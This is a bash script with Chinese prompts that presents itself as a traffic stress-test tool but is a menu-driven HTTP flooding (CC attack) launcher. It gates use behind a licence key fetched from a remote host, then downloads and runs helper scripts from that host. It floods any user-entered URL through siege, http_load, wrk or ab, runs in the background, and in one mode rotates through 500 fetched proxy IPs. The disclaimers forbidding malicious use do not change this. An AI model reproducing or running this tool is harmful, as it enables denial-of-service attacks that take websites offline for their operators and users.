#!/bin/bash
echo "
============================================================================"
echo -e "\033[34m                            欢迎使用流量压力测试\033[0m"
			     
			     echo -e "\033[31m 1，执行前务必先看 \033[0m"
			     echo -e "\033[31m 2，禁止用于恶意攻击 \033[0m"
			     echo -e "\033[31m 3，禁止攻击正规平台 \033[0m"
			     echo -e "\033[31m 3，禁止用于非法用途(重) \033[0m"
			     echo -e "\033[31m 4，本脚本仅用于压力测试 \033[0m"
			     echo -e "\033[31m 5，以上内容请诸位务必遵循 \033[0m"
			     echo -e "\033[31m 6，因为本脚本引起的各种法律纠纷与本作者无关，使用表示同意 \033[0m"
echo -e "\033[36m                                                         作者：千狐の王座 \033[0m"
echo -e "\033[36m                                                         qq群：659126869 \033[0m"
echo "============================================================================"

echo -e "\033[34m 
#---一个来自深渊，从墩厚化危险的网络过客---#
#世界上有一种人，他们均把开心建立在别人的痛苦之上，你们猜，是什么人？#
\033[0m"
ES_HOME=/root
pass=`wget http://qianjihu.com/jb/32xx -O - -q ; echo`;
echo -e "\033[35m 请输入授权码（qq群获取）： \033[0m"
read PASSWD
key=`echo -n $PASSWD|md5sum`
if [[ ${key%%\ *} == $pass ]]
    then
        echo 
        echo -e "\033[35m 授权成功 \033[0m"
    else
        echo
        echo -e "\033[31m 授权码错误 \033[0m"
		echo "$Error";
		
exit 0;
fi
echo -e "\033[31m 因为本脚本导致的法律纠纷与本作者无关，同意并知晓请输入y/不同意请输入n \033[0m"
read yn
if [[ $yn == y ]]
    then
        echo 
        echo -e "\033[31m 已同意并已知晓！ \033[0m"
    else
        echo
        echo -e "\033[32m 未同意不得用本程序！进程已结束 \033[0m"
          rm -rf siege-4.0.4
        rm -rf siege-4.0.4.tar.gz
        rm -rf sie.* cll.* cq.* ws gj.* ws.* wrk.*
        rm -rf $ES_HOME/www
        rm -rf /usr/local/bin/siege
        rm -rf /usr/local/bin/siege2csv.pl
        rm -rf /usr/local/bin/siege.config
        rm -rf $ES_HOME/urls.txt
        rm -rf $ES_HOME/http_load-09Mar2016
        rm -rf  $ES_HOME/http_load-09Mar2016.tar.gz
        rm -rf /usr/local/bin/http_load
        rm -rf /usr/local/etc/urls.txt
        rm -rf /usr/local/etc/siegerc.new
        rm -rf /usr/local/etc/siegerc
        rm -rf /root/.siege
        rm -rf /root/wrk
		echo "$Error";		
exit 0;
fi
echo "============================================================================"
echo -e "\033[32m 请选择（注意用之前先执行卸载，同时用残余文件可能会清理不干净到时候起冲突）： \033[0m"
echo -e "\033[32m 1，卸载 \033[0m"
echo -e "\033[32m 2，纯流量 \033[0m"
echo -e "\033[32m 3，sieCC \033[0m"
echo -e "\033[32m 4，HTTPCC \033[0m"
echo -e "\033[32m 5，wrcc \033[0m"

echo "============================================================================"
read -p "请输入序号:" b
if (($b==1));then
echo -e "\033[32m 开始卸载 \033[0m"
cd /root
rm -rf siege-4.0.4
rm -rf siege-4.0.4.tar.gz
rm -rf sie.* cll.* cq.* ws gj.* ws.* wrk.*
rm -rf $ES_HOME/www
rm -rf /usr/local/bin/siege
rm -rf /usr/local/bin/siege2csv.pl
rm -rf /usr/local/bin/siege.config
rm -rf $ES_HOME/urls.txt
rm -rf $ES_HOME/http_load-09Mar2016
rm -rf  $ES_HOME/http_load-09Mar2016.tar.gz
rm -rf /usr/local/bin/http_load
rm -rf /usr/local/etc/urls.txt
rm -rf /usr/local/etc/siegerc.new
rm -rf /usr/local/etc/siegerc
rm -rf /root/.siege
rm -rf /root/wrk

echo -e "\033[32m 卸载成功 \033[0m"
exit 0;

elif (($b==2));then
echo -e "\033[32m 已选择纯流量， \033[0m"
echo -e "\033[32m 创建暂存文件夹并赋予权限 \033[0m"
mkdir $ES_HOME/www && chmod +xxx $ES_HOME/www
echo -e "\033[32m 下载脚本 \033[0m"
wget -P $ES_HOME qianjihu.com/jb/cll.sh
wget -P $ES_HOME qianjihu.com/jb/ws
echo -e "\033[32m 赋予权限 \033[0m"
chmod +xxx $ES_HOME/cll.sh $ES_HOME/ws
echo -e "\033[32m 请输入抓包的大文件地址 \033[0m"
read cll
sed -i "s#https://gc2011.com/wapStatic/js/vendor.fb6e8f81f05eedd0d36e.js#"${cll}"#g" $ES_HOME/cll.sh
echo -e "\033[32m 准备开始纯流量......... \033[0m"
nohup ./cll.sh &
echo -e "\033[32m 已在后台运行 \033[0m"
echo -e "\033[35m 查看实时网速命令为./ws \033[0m"
echo -e "\033[35m 弹出nohup: appending output to 'nohup.out'按回车 \033[0m"
exit 0;


elif (($b==3));then
echo -e "\033[35m 您选择了sieCC \033[0m"
echo precedence ::ffff:0:0/96 100>>/etc/gai.conf
echo -e "\033[35m 禁用ipv6成功 \033[0m"
apt-get update -y
apt-get install gcc build-essential -y
apt-get install gcc automake autoconf libtool make -y
echo -e "\033[35m 安装环境成功 \033[0m"
wget http://qianjihu.com/jb/siege-4.0.4.tar.gz
tar xvf siege-4.0.4.tar.gz
cd siege-4.0.4
./configure
make
make install
echo -e "\033[35m 4.0.4安装成功 \033[0m"
cd
rm -rf /root/sie.sh
rm -rf /root/.siege
echo -e "\033[35m 删除配置成功 \033[0m"
touch sie.sh && chmod +xxx sie.sh
echo -e "\033[35m 创建sie.sh脚本并赋予执行权限成功 \033[0m"
echo siege -c 10 -r 11 -t 12 http://bjdr0917.com>>$ES_HOME/sie.sh
echo -e "\033[35m 代码写入sie.sh成功 \033[0m"
echo -e "\033[35m 下载实时网速脚本 \033[0m"
wget -P $ES_HOME qianjihu.com/jb/ws
chmod +xxx $ES_HOME/ws
cd
rm -rf siege-4.0.4.tar.gz
echo -e "\033[35m 删除无用文件成功 \033[0m"
touch cq.sh && chmod +xxx cq.sh
echo -e "\033[35m 创建重启脚本并赋予权限成功 \033[0m"
echo reboot>>$ES_HOME/cq.sh
echo -e "\033[35m 向cq.sh写入重启命令成功 \033[0m"
echo -e "\033[35m 再次强调是否已知晓是y/否n \033[0m"
read yn
if [[ $yn == y ]]
    then
        echo 
        echo -e "\033[32m 本人已知晓 \033[0m"
    else
        echo
        echo -e "\033[32m 不知晓就重头看清楚 \033[0m"
rm -rf siege-4.0.4
        rm -rf siege-4.0.4.tar.gz
        rm -rf sie.* cll.* cq.* ws gj.* ws.*
        rm -rf $ES_HOME/www
        rm -rf /usr/local/bin/siege
        rm -rf /usr/local/bin/siege2csv.pl
        rm -rf /usr/local/bin/siege.config
        rm -rf $ES_HOME/urls.txt
        rm -rf $ES_HOME/http_load-09Mar2016
        rm -rf  $ES_HOME/http_load-09Mar2016.tar.gz
        rm -rf /usr/local/bin/http_load
        rm -rf /usr/local/etc/urls.txt
rm -rf /usr/local/etc/siegerc.new
rm -rf /usr/local/etc/siegerc
rm -rf /root/.siege
		echo "$Error";		
exit 0;
fi
echo -e "\033[35m 选择cc方式(默认模拟用户10次数11) \033[0m"
read -p "1默认2自定义:" a
 if (($a==1));then
 echo -e "\033[35m 目标网站要带http(默认模拟用户10次数11) \033[0m"
read wz
 sed -i "s#http://bjdr0917.com#"${wz}"#g" $ES_HOME/sie.sh
echo -e "\033[35m 目标网站设置成功 \033[0m"
echo -e "\033[35m 请输入持续测试时间(单位是秒) \033[0m"
read time
sed -i 's/12/'"${time}"'/g' $ES_HOME/sie.sh
echo -e "\033[35m 时间设置成功 \033[0m"
echo -e "\033[35m 全局设置完成 \033[0m"
echo -e "\033[35m 准备运行......................... \033[0m"
echo -e "\033[35m 加入后台运行 \033[0m"
nohup ./sie.sh &
echo -e "\033[35m 已在后台运行 \033[0m"
echo -e "\033[35m 查看实时网速命令为./ws \033[0m"
echo -e "\033[35m 弹出nohup: appending output to 'nohup.out'按回车 \033[0m"
exit 0;
elif (($a==2));then
 echo -e "\033[35m 自定义模式(按配置填，填高自己秒死) \033[0m"
 echo -e "\033[35m 输入模拟用户数量(推荐50) \033[0m"
 read yh
 sed -i 's/10/'"${yh}"'/g' $ES_HOME/sie.sh
 echo -e "\033[35m 次数设置(推荐2) \033[0m"
 read cs
 sed -i 's/11/'"${cs}"'/g' $ES_HOME/sie.sh
 echo -e "\033[35m 设置持续时间(单位秒) \033[0m"
 read time
sed -i 's/12/'"${time}"'/g' $ES_HOME/sie.sh
echo -e "\033[35m 时间设置成功 \033[0m"
echo -e "\033[35m 输入目标网址带http的 \033[0m"
 read wz
 sed -i "s#http://bjdr0917.com#"${wz}"#g" $ES_HOME/sie.sh
 echo -e "\033[35m 目标地址设置成功 \033[0m"

echo -e "\033[35m 全局设置完成 \033[0m"
echo -e "\033[35m 准备运行......................... \033[0m"
echo -e "\033[35m 加入后台运行 \033[0m"
nohup ./sie.sh &
echo -e "\033[35m 已在后台运行 \033[0m"
echo -e "\033[35m 查看实时网速命令为./ws \033[0m"
echo -e "\033[35m 弹出nohup: appending output to 'nohup.out'按回车 \033[0m"
exit 0;
fi


elif (($b==4));then
echo -e "\033[35m 已选择HTTPCC \033[0m"
echo -e "\033[35m 优先清理残余文件.... \033[0m"
rm -rf  /root/http_load-09Mar2016
rm -rf  /root/http_load-09Mar2016.tar.gz
rm -rf  /root/http_load-09Mar2016.tar.gz.1
rm -rf /root/urls.txt
rm -rf /usr/local/bin/http_load
sleep 2
echo -e "\033[35m 开始安装...... \033[0m"
wget http://acme.com/software/http_load/http_load-09Mar2016.tar.gz
tar xfz http_load-09Mar2016.tar.gz
cd http_load-09Mar2016
make
make install
echo -e "\033[35m 安装完成 \033[0m"
wget -P /root qianjihu.com/jb/urls.txt && chmod+xxx /root/urls.txt
wget -P /root qianjihu.com/jb/ws
chmod +xxx /root/ws
echo -e "\033[35m 输入网址(都要带http) \033[0m"
read wz
sed -i "s#http://gc2011.com#"${wz}"#g" $ES_HOME/urls.txt
echo -e "\033[35m 输入并发次数 \033[0m"
read bf
echo -e "\033[35m 输入持续时间 \033[0m"
read time
echo -e "\033[35m 开始执行..... \033[0m"
http_load -p $bf -s $time $ES_HOME/urls.txt &
echo -e "\033[35m 输入./ws回车查看实时网速 \033[0m"
exit 0;


elif (($b==5));then
echo -e "\033[35m 已选择wrcc...... \033[0m"
rm -rf ws ws.* wrk.* wrk
apt-get update -y
apt-get install gcc build-essential -y
apt-get install gcc automake autoconf libtool make -y
echo -e "\033[35m 环境安装成功..... \033[0m"
wget -P /root qianjihu.com/jb/wrk.zip
unzip wrk.zip -d /root
echo -e "\033[35m 准备编译..... \033[0m"
cd /root/wrk
make -j12
echo -e "\033[35m 编译完成..... \033[0m"
wget -P /root qianjihu.com/jb/ws
chmod +xxx /root/ws
rm -rf /root/wrk.zip
cd /root/wrk
echo -e "\033[35m 请输入线程数，视配置而定，低配建议50~200 \033[0m"
read xc
echo -e "\033[35m 输入测试时间（30秒就输入30s,3分钟就输入3m,1小时输入1h） \033[0m"
read time
echo -e "\033[35m 输入压力测试地址(带http) \033[0m"
read dz
./wrk -t12 -c$xc -d$time $dz &
echo -e "\033[35m 输入./ws回车查看实时网速 \033[0m"
echo -e "\033[35m 出现Running 30s test @ $dz
  12 threads and 50 connections可以直接按回车然后查看速度 \033[0m"
exit 0;


elif (($b==6));then
echo -e "\033[35m 这是第五种，强势ab \033[0m"
echo -e "\033[35m 开始安装 \033[0m"
apt-get install apache2-utils -y
wget -P /root/新代理ip.txt http://www.xiladaili.com/api/?uuid=6d4a27c86b424feeaa79c0fb55bec5d5&num=500&place=中国&protocol=3&sortby=0&repeat=1&format=4&position=0
sed 's/<br>/\n/g' 新代理ip.txt >> ip2.txt
sort -n ip2.txt | uniq > ip.txt
rm -rf 新代理ip.txt ip2.txt
wget qianjihu.com/jb/ab.sh && chmod +xxx ab.sh
echo -e "\033[35m 请输入并发数 \033[0m"
read bf
sed -i 's/300/'"${bf}"'/g' $ES_HOME/ab.sh
echo -e "\033[35m 输入总共请求次数 \033[0m"
read zgcs
sed -i 's/5/'"${zgcs}"'/g' $ES_HOME/ab.sh
echo -e "\033[35m 输入持续时间 \033[0m"
read time
sed -i 's/1000/'"${time}"'/g' $ES_HOME/ab.sh
echo -e "\033[35m 输入地址：带http的 \033[0m"
read dz
sed -i "s#http://81.70.18.208#"${dz}"#g" $ES_HOME/ab.sh

bash ab.sh

echo -e "\033[35m 开始执行.. \033[0m"
exit 0;



elif (($b==7));then


exit 0;

else
echo
fi
